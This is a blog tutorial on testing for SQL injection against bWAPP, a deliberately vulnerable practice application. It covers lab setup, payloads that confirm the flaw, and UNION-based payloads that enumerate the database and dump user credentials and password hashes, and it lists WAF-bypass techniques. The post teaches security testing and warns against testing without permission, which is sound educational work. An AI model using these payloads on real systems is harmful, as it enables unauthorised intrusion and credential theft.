---
layout: "post"
title: "Testing for SQL Injection Vulnerabilities"
comments: true
date: "2019-04-02 8:00"
---

SQL injection (SQLi) is the submission of SQL syntax to a vulnerable input field, which is then used by an application in the dynamic construction of a database query. This attack is possible when user input is insufficiently validated and can be interpreted by a database management system (DBMS) as code. A malicious user can inject SQL to disrupt or alter queries to the database, potentially leading to the exposure of sensitive data such as usernames, passwords, and credit card numbers.

### Agenda

This guide aims to serve as an introduction to testing for SQL injection and walks through the following operations:

- Installation of a test environment.
- Identification of an SQL injection vulnerability.
- Confirmation and exploitation the vulnerability.
- Best practices for reporting security vulnerabilities.

Tools are not used in this exercise, however, some popular tools will be listed in the resources section below.

Code review for SQL injection will be covered in a later post.

### Prerequisites

To get the most out of this guide, you'll need to be familiar with the HyperText Transfer Protocol (HTTP) and the following languages:

- HTML
- PHP
- SQL

If you wish to follow along, you'll also need to configure an Apache/PHP/MySQL environment.

## Test Responsibly

Read this section before continuing to the demonstration. I'm not accountable for anything you break using the information in this post.

### DON'T do it Yourself

This guide is intended for people who are interested in learning about security. It should **NOT** be used by website owners for do-it-yourself security testing. The effectiveness of SQL injection greatly depends on the skill of the tester. Please hire a security expert or team of experts if you require thorough testing.

### DON'T Test Without Permission

Testing a live application without its owner's consent can result in legal ramifications. Do not begin testing without written permission, a defined scope, and defined rules of engagement. You should also be confident that the person permitting security testing owns the property or has the authority to authorize testing.

### Avoid Testing Live Environments

It is possible to delete or overwrite data by injecting SQL into a database query. I highly recommend creating a copy of your application to be used specifically for testing -- especially while you're learning. If you must test an application in production, confirm there are backups of its data first.

## Test Environment Setup

For this demonstration, I'm using a test-application called bWAPP (Buggy Web Application).

### Installing bWAPP

1. Download bWAPP from [itsecgames.com](http://www.itsecgames.com/) as either a compressed folder of source files, which can be installed to any PHP/MySQL development environment such as [WAMP](http://www.wampserver.com/en/) or pre-installed as part of a custom Linux virtual machine called _bee-box_.  
2. Extract the source files, then move the **bWAPP** folder to your root server directory (E.g. 'C:\wamp64\www' for WAMP).
3. Open **bWAPP/admin/settings.php**, then configure **$db_username** and **$db_password** to match your MySQL login credentials.
4. While your server is running, open **bwapp/install.php** in a browser, then click the installation link. This will create a database for the application and redirect you to a login page.
5. Login to bWAPP. The default username is **bee** and password is **bug**.
6. Select **SQL injection (GET/Search)** from the list of bugs, then click **Hack**. You should be redirected to **bwapp/sqli_1.php**.

> **NOTE:** I'm using PHP 5.6.40 and MySQL 5.7.25. You may experience different results using other versions in your test environment.

These installation steps, along with detailed requirements, are also listed in **install.txt**, which is located in the root directory of the folder you downloaded in Step 1.

### Troubleshooting

bWAPP/sqli_1.php connects to a database using **mysql_connect()**. This function was deprecated in PHP 5.5.0 and removed in PHP 7.0.0. If you receive a fatal error: **Call to undefined function mysql_connect()** while trying to use the search feature on page **bwapp/sqli_1.php**, consider downgrading from PHP 7 to PHP 5 for this test only. Real PHP applications should run on an updated version of PHP and use [PHP Data Objects (PDO)](https://www.php.net/manual/en/book.pdo.php) to perform database queries.

If you encounter other errors, post them in a comments section below.

## Testing

Go to the search box on page **bwapp/sqli_1.php** to begin. 

### Identify Inputs

First, we need to identify all sources of user input within the scope of our test. In this example, we are exclusively testing the **Search for a movie** form, however, a typical scope could potentially include one or more inputs, features, or pages.

User input is commonly submitted in the form of a GET or POST request, but can also be included in cookies and request headers. Any input on the client-side can be manipulated by a user. This also applies to obscure elements such as hidden form inputs, which are not displayed on a page but can be seen and manipulated in the page's source code. 

Radio buttons and checkboxes are other examples. While those elements are typically only checked or unchecked, their values can be edited in the source code.

> **NOTE**: This is why it is imperative to validate input server-side. If a form is only validated by the user's client, they can easily edit or delete the validation before submission.

[View the page source](https://www.lifewire.com/view-web-source-code-4151702) and scroll down to the **Search for a movie** form.


```html
<form action="/sqli_1.php" method="GET">

  <p>

  <label for="title">Search for a movie:</label>
  <input type="text" id="title" name="title" size="25">

  <button type="submit" name="action" value="search">Search</button>

  </p>

</form>
```

This form contains two input variables:

- **title** is defined in the **input** element and is assigned a value of whichever string is in this field upon form-submission.
- **action** is defined in the **button** element and is assigned the value **"search"** upon submission.

We can also confirm that there are no hidden inputs and that the data is submitted through a GET request. This is reflected in the URL when we use the search function. Go back to **bwapp/sqli_1.php**, then enter "test" into the search form and click **Search**:

{:style="overflow: auto; white-space: nowrap;"}
`bwapp/sqli_1.php?title=test&action=search`

For other request methods, you may need to use a proxy server, such as the one available in the free and open source application [ZAP](https://github.com/zaproxy/zaproxy), to see and edit the data being transferred.

### Identify the Inputs' Applications

Now that all of the inputs within our scope have been identified, we can try to determine how those inputs are used by the application. It is important to keep all variables constant except the one being tested so that the results can be attributed to a single cause.

Alter the **bwapp/sqli_i.php** URL to perform the following tests on the **title** parameter:

<!-- URL Parameters                | Result
------------------------------|---------------------------------------------------------------------------------
?title=1&action=search        | 'No movies were found!' is returned.
?title=&action=search         | Presumably all movies are returned.
?action=search                | Nothing is returned.
<span style="white-space: nowrap;">?title=iron&action=search</span> | Presumably all movies containing the word 'the' (case-insensitive) are returned. -->

<div class="no-overflow">
<table>
  <thead>
    <tr>
      <th>URL Parameters</th>
      <th>Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>?title=1&amp;action=search</td>
      <td>‘No movies were found!’ is returned.</td>
    </tr>
    <tr>
      <td>?title=&amp;action=search</td>
      <td>Presumably all movies are returned.</td>
    </tr>
    <tr>
      <td>?action=search</td>
      <td>Nothing is returned.</td>
    </tr>
    <tr>
      <td><span style="white-space: nowrap;">?title=iron&amp;action=search</span></td>
      <td>Presumably all movies containing the word ‘the’ (case-insensitive) are returned.</td>
    </tr>
  </tbody>
</table>
</div>

Given these results, we can determine that the **title** variable is being used in an SQL query that probably looks similar to: 

```sql
SELECT title, release, character, genre, imdb 
FROM movie
WHERE title LIKE '%title%'
ORDER BY title ASC;

/* Where in "..LIKE '%title%'", title is equal to $_GET["title"], which is a string and may or may not be validated, and % is a wildcard representing one or more characters. */
```

Now test the **action** variable:

URL Parameters      | Result
--------------------|------------------------------------
?title=&action=1    | Presumably all movies are returned.
?title=&action=test | Presumably all movies are returned.
?title=&action=     | Presumably all movies are returned.
?title=             | Presumably all movies are returned.

The **action** variable is not affecting an SQL query within our test scope and is therefore probably not a potential candidate for SQL injection.

> **NOTE**: We are performing black box testing, however, if we were referencing the server-side code in our test, we could confirm that **$\_GET["action"]** is not used anywhere within scope.

### Inject SQL

In this section, we're injecting SQL into the URL's **title** parameter. Since **title** accepts a string value and is likely wrapped in quotes, try to create a syntax error by submitting unpaired quotation marks.

>**NOTE**: The URL encoding of `'` is `%27` and `"` is `%22`.

<!-- URL Parameters         | Result
-----------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<span style="white-space: nowrap;">?title=%27&action=search</span> | 'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1' is returned.
<span style="white-space: nowrap;">?title=%22&action=search</span> | 'No movies were found!' is returned. -->

<div class="no-overflow">
<table>
  <thead>
    <tr>
      <th>URL Parameters</th>
      <th>Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>?title=%27&action=search</td>
      <td>'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1' is returned.</td>
    </tr>
    <tr>
      <td>?title=%22&action=search</td>
      <td>'No movies were found!' is returned.</td>
    </tr>
  </tbody>
</table>
</div>

The application returns a MySQL error indicating the single quote is being interpreted as code and breaks the query:

<!-- 
The following codeblock messes up syntax highlighting beneath it if not converted to HTML.
============================= ORIGINAL INPUT =============================


```sql
/* ?title=iron - An anticipated search, which works as intended. */

SELECT title, release, character, genre, imdb 
FROM movie
WHERE title LIKE '%iron%'
ORDER BY title ASC;


/* ?title=%27 - An unanticipated search, which breaks the query. */

SELECT title, release, character, genre, imdb 
FROM movie
WHERE title LIKE '%'%'
ORDER BY title ASC;  
``` 

=============================== OUTPUT ===================================  
-->

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Visualization of the Potential Database Queries */</span>


<span class="cm">/* ?title=iron - An anticipated search, which works as intended. */</span>

<span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
<span class="k">FROM</span> <span class="n">movie</span>
<span class="k">WHERE</span> <span class="n">title</span> <span class="k">LIKE</span> <span class="s1">'%iron%'</span>
<span class="k">ORDER</span> <span class="k">BY</span> <span class="n">title</span> <span class="k">ASC</span><span class="p">;</span>


<span class="cm">/* ?title=%27 - An unanticipated search, which breaks the query. */</span>

<span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
<span class="k">FROM</span> <span class="n">movie</span>
<span class="k">WHERE</span> <span class="n">title</span> <span class="k">LIKE</span> <span class="s1">'%'</span><span class="o">%</span><span class="s1">'
ORDER BY title ASC; 
</span></code></pre></div></div>

<!-- ===================================================================  -->

> **NOTE**: It is almost never this easy. Most applications have custom error messages, partial validation, or are protected by firewalls and intrusion prevention software. Some techniques for bypassing common defenses include:
>
- Adding whitespace
- Changing the case of keywords
- Character encoding
- Null bytes
- Replacing spaces with comments
- URL encoding
>
>Pay attention to how the DBMS reacts to your query and adjust accordingly. See the resources provided below for more information on bypassing defenses.

Now compare the following tests:

URL Parameters                        | Result
--------------------------------------|------------------------------------
?test=iron&action=Search              | The movie 'Iron Man' is returned.
?title=iron%27+or+1=1+-\-+&action=search | Presumably all movies are returned.

The second request queries the database to select all movies where the title is like "%iron%" or where 1 is equal to 1. Since 1 is always equal to 1, the database selects all movies. The hyphens at the end of the statement comment-out everything that follows, preventing the DBMS from parsing the remainder of the query.

<!-- 
The following codeblock messes up syntax highlighting beneath it if not converted to HTML.
============================= ORIGINAL INPUT =============================
```sql
/* ?title=iron */

SELECT title, release, character, genre, imdb 
FROM movie
WHERE title LIKE '%iron%'
ORDER BY title ASC;


/* ?title=%27 */

SELECT title, release, character, genre, imdb 
FROM movie
WHERE title LIKE '%iron' OR 1=1 -- %'
ORDER BY title ASC;  
``` 
=============================== OUTPUT ===================================  
-->

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Visualization of the Potential Database Queries */</span>


<span class="cm">/* ?title=iron */</span>

<span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
<span class="k">FROM</span> <span class="n">movie</span>
<span class="k">WHERE</span> <span class="n">title</span> <span class="k">LIKE</span> <span class="s1">'%iron%'</span>
<span class="k">ORDER</span> <span class="k">BY</span> <span class="n">title</span> <span class="k">ASC</span><span class="p">;</span>


<span class="cm">/* ?title=%27 */</span>

<span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="n">release</span><span class="p">,</span> <span class="n">character</span><span class="p">,</span> <span class="n">genre</span><span class="p">,</span> <span class="n">imdb</span> 
<span class="k">FROM</span> <span class="n">movie</span>
<span class="k">WHERE</span> <span class="n">title</span> <span class="k">LIKE</span> <span class="s1">'%iron'</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">-- %'</span>
<span class="c1">ORDER</span> <span class="c1">BY</span> <span class="c1">title</span> <span class="c1">ASC</span><span class="c1">;</span>  
</code></pre></div></div>

<!-- ===================================================================  -->

### Exploiting a Vulnerability

We've proven that we can successfully submit SQL syntax to alter a database query. If this is as far as we could go, it would still be worth reporting, however, it is almost always better to provide a proof of concept in the bug report. (Especially for bug bounties.)

><span class="warning">**IMPORTANT**</span>: Don't compromise an application or data that is in production. If you're unsure if you should proceed, talk to your supervisor or the person who authorized the test.

#### Union Based Exploitation

The UNION operator is used to combine two or more SELECT statements. 

```sql

/* Example */

SELECT column_one, column_two FROM table_one
UNION
SELECT column_one, column_two FROM table_two;

/* This query would return all data in column_one and column_two of both table_one and table_two. */

```

A union statement must meet two requirements to be successful:

- Both data sets must have the same number of columns.
- All data within a column must have a compatible data type. E.g. Strings cannot be combined with a numerical column.

The movie table has 5 columns displayed in the application, so modify the URL to union a select statement with 5 columns. If an error is returned, add an additional column. Continue to add and submit columns to the select statement until the query is successful.

<!-- ===========================================================================================
Blows out viewport

URL Parameters                                  | Result
------------------------------------------------|--------------------------------------------------------------------------------------------
?title=%27UNION+SELECT+1,2,3,4,5+-\-+&action=search     | 'Error: The used SELECT statements have a different number of columns' is returned.
?title=%27UNION+SELECT+1,2,3,4,5,6+-\-+&action=search   | 'Error: The used SELECT statements have a different number of columns' is returned.
?title=%27UNION+SELECT+1,2,3,4,5,6,7+-\-+&action=search | Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4. -->

<div class="no-overflow">
<table>
  <thead>
    <tr>
      <th>URL Parameters</th>
      <th>Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>?title=%27UNION+SELECT+1,2,3,4,5+--+&amp;action=search</td>
      <td>‘Error: The used SELECT statements have a different number of columns’ is returned.</td>
    </tr>
    <tr>
      <td>?title=%27UNION+SELECT+1,2,3,4,5,6+--+&amp;action=search</td>
      <td>‘Error: The used SELECT statements have a different number of columns’ is returned.</td>
    </tr>
    <tr>
      <td>?title=%27UNION+SELECT+1,2,3,4,5,6,7+--+&amp;action=search</td>
      <td>Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4.</td>
    </tr>
  </tbody>
</table>
</div>

<!-- =============================================================================== -->

This indicates that the table which the application is querying contains 7 columns, but only 4 of those columns are displayed within the application itself. Columns 2, 5, and 4, allow text data type. Column 3 is either a number or text data type. 

#### Fingerprinting 

Now we can begin to union more useful selections in place of the displayed numbers. Submit the following GET request to determine the database user, version number, name, and schema:

{:style="overflow: auto; white-space: nowrap;"}
 `?title=%27UNION+SELECT+1,current_user(),@@version,database(),schema(),6,7+--+&action=search` 

The variables and functions in this query are built into MySQL. I pulled them from a generic MySQL injection cheat sheet. You can find links to SQLi payloads in the resources section below or by using any search engine, such as DuckDuckGo. 

The reason I know we are working with MySQL is because the error message that was returned from the `?title=%27&action=search` request included the phrase "MySQL server". If a verbose error message was not returned, you could determine the DBMS by submitting database-specific operators and identifying which ones execute successfully. 

E.g. The concatenation operator: 

DBMS       | Concatenation
-----------|------------------------------------
MS SQL     | 'a' + 'a'
MySQL      |  CONCAT('a','a')
Oracle     |  'a' \|\| 'a', <br> CONCAT('a','a')
Postgres   |  'a' \|\| 'a'

After the SQL server and version number are identified, search for known vulnerabilities in those technologies.  

#### Enumerating Databases

Information_schema is a default database on MySQL servers which contains metadata about the server.

Manipulate the previous GET request to return the name of all databases on the server: 

1. Replace the value of one of the columns that are displayed on the page with **schema_name**.
2. Add a **FROM information_schema.schemata** clause to the end of the statement.

{:style="overflow: auto; white-space: nowrap;"}
 `?title=%27UNION+SELECT+1,schema_name,3,4,5,6,7+FROM+information_schema.schemata--+&action=search` 
 
These are my results, but yours may vary depending on your enviroment:


Databases          |
------------------ |
information_schema |
bWAPP              |
mysql              |
performance_schema |
sys                |


The default database name for bWAPP is "bWAPP".

#### Enumerating Tables

Select table_schema and table_name from information_schema.tables:

{:style="overflow: auto; white-space: nowrap;"}
`?title=%27UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+--+&action=search`

This returns all tables for all databases. If you only want to show the tables in bWAPP, append a WHERE clause to the previous query:

{:style="overflow: auto; white-space: nowrap;"}
`?title=%27UNION+SELECT+1,table_schema,3,table_name,5,6,7+FROM+information_schema.tables+WHERE+table_schema="bWAPP"--+&action=search`

Results:

Database | Table
---------|---------
bWAPP    | blog
bWAPP    | heroes
bWAPP    | movies
bWAPP    | users
bWAPP    | visitors

#### Enumerating Columns

Let's check out the **users** table. Select table_name and column_name from information_schema.columns where table_name is equal to "users":

{:style="overflow: auto; white-space: nowrap;"}
`?title=%27UNION+SELECT+1,table_name,3,column_name,5,6,7+FROM+information_schema.columns+WHERE+table_name="users"--+&action=search`


Results:

Table | Column
------|--------------------
users | id
users | login
users | password
users | email
users | secret
users | activation_code
users | reset_code
users | admin
users | USER
users | CURRENT_CONNECTIONS
users | TOTAL_CONNECTIONS

#### Dumping User Credentials

The **users** table has 11 columns, but we only have four columns to work with. I am mostly interested in the username, password, email, and user permissions, so let's select those.

{:style="overflow: auto; white-space: nowrap;"}
`?title=%27UNION+SELECT+1,login,admin,password,email,6,7+FROM+users--+&action=search`

Results:

<!-- =================================================================================
Blows out view port if not html.

login | admin | email                    | password
------|-------|--------------------------|-----------------------------------------
A.I.M | 1     | bwapp-aim@mailinator.com | 6885858486f31043e5839c735d99457f045affd0
bee   | 1     | bwapp-bee@mailinator.com | 6885858486f31043e5839c735d99457f045affd0 -->

<div class="no-overflow">
<table style="overflow: auto;">
  <thead>
    <tr>
      <th>login</th>
      <th>admin</th>
      <th>email</th>
      <th>password</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>A.I.M</td>
      <td>1</td>
      <td>bwapp-aim@mailinator.com</td>
      <td>6885858486f31043e5839c735d99457f045affd0</td>
    </tr>
    <tr>
      <td>bee</td>
      <td>1</td>
      <td>bwapp-bee@mailinator.com</td>
      <td>6885858486f31043e5839c735d99457f045affd0</td>
    </tr>
  </tbody>
</table>
</div>

<!-- ================================================================================= -->

&nbsp;

A malicious user could attempt to crack the hashed passwords with tools like John the Ripper, RainbowCrack, or in this case, an [online search](https://duckduckgo.com/?q=6885858486f31043e5839c735d99457f045affd0).

#### Conclusion

If you're interested in continuing, a few things you could try are:

- **Continue dumping tables and columns** - Check out other columns in the users table. I've not tested it, but I'm curious if secret, activation_code, or reset_code could be used to take over another user's account.
- **Stacked queries** - Try to append an UPDATE or INSERT statement to the SELECTION statement.
- **Escalate privileges** - Create a non-admin user and attempt to escalate their privileges to admin using SQL injection.
- **Remote code execution** - Execute code on the server through SQL injection.
- **Increase the security setting** - bWAPP has low, medium, and high security options. We have been testing on low, but most applications are more secure.

## Reporting

When reporting vulnerability bugs, follow the guidelines provided by the company you work for or the platform you're testing on. E.g. Bugcrowd.

Include detailed steps to reproduce the bug. Don't make any assumptions about the reader's experience with security vulnerabilites.

Describe the bug in terms of its business impact, rather than the technical details of its exploitation.

Take the time to proofread your report. Is it obvious which objects or people you're talking about when you refer to them?

## Resources

We have only covered a basic example of SQL injection, which does not account for custom error messages, out-of-band injection, partial validation, intrusion prevention systems, or other advanced defenses that are encounter in real-world testing. See the resources provided below to continue learning and become a more efficient tester.

All resources are free, apart from _SQL Injection Attacks and Defense, 2nd ed_. Most items are followed by a year in parenthesis which represents the last year that resource was updated as of the date of this publication.

### Learning SQL

- [SQLBolt](https://sqlbolt.com/) - Interactive website for learning SQL.
- [Hacker Rank](https://www.hackerrank.com/domains/sql?filters%5Bstatus%5D%5B%5D=unsolved&badge_type=sql) - This site doesn't teach SQL but hosts a collection of SQL practice-questions ranging in complexity.

### Learning SQL Injection

- [SQL Injection Attacks and Defense, 2nd ed](https://www.amazon.com/Injection-Attacks-Defense-Justin-Clarke/dp/1597499633/ref=sr_1_2?keywords=sql+injection+book&qid=1552931384&s=gateway&sr=8-2) - The most thorough introduction to SQL injection available. (2012)
- [OWASP - Vulnerable web applications](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project#tab=Main) - A list of vulnerable web applications, written in various technologies, for practicing security testing. (2018)
- [Devilbox](https://github.com/cytopia/devilbox) - A Docker composition providing local, quickly customizable, LAMP and MEAN development environments. (2019)
- [OWASP - Penetration testing methodologies](https://www.owasp.org/index.php/Penetration_testing_methodologies) (2019)

### Testing References

Known Vulnerabilities:

- [Exploit Database](https://www.exploit-db.com/)
- [National Vulnerability Database](https://nvd.nist.gov/vuln/search)

Payloads:

- [NetSPI - SQL attack queries](https://sqlwiki.netspi.com/attackQueries/) (2019)
- [fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection) (2016)
- [Bug bounty cheat sheet - SQLi](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md) - An unordered list of relevant cheat sheets. (2017)

Bypassing Firewalls:

- [OWASP - Bypassing firewalls](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) (2017)
- [CWH Underground -Beyond SQLi: Obfuscate and Bypass](https://www.exploit-db.com/papers/17934) (2011)

### Open Source Tools

- [Metasploit](https://github.com/rapid7/metasploit-framework) (2019)
- [OWASP-ZAP](https://github.com/zaproxy/zaproxy) (2019)
- [SQLMap](https://github.com/sqlmapproject/sqlmap) (2019)
- [SQLNinja](https://sourceforge.net/projects/sqlninja/) (2014)

### Reporting

- [OWASP - Vulnerability disclosure cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.md) (2019)

### Legal

- [Computer Crime Research Center - Legislation](http://www.crime-research.org/legislation/)
- [Fraud and related activity in connection with computers (U.S.)](https://www.law.cornell.edu/uscode/text/18/1030)

## References

- Clarke, Justin. _SQL Injection Attacks and Defense, 2nd ed_. Waltham: Syngress. 2012.
- Meucci, Matteo and Andrew Muller. _The OWASP Testing Guide, v4_. 2014.
- PCI Security Standards Council. _PCI Data Security Standard (PCI DSS), v1._. 2015.
